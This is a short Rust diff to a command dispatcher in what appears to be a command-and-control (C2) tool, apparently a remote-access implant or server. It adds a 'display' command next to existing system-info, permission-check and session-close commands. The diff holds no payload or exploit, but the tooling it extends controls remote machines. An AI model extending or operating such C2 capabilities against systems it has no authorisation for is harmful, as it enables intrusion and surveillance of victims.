@@ -18,6 +18,7 @@ pub fn dispatch_client(instruct:  Vec<&str>, conn: &mut TcpStream, state: &C2Sta
         // System commands
         Some(&"sysinfo") => client::system::sysinfo(conn),
         Some(&"check") => client::system::check_permissions(conn),
+        Some(&"display") => client::system::display(&instruct, conn),
 
         // Close
         Some(&"close") => client::control::close_session(conn, state, true),
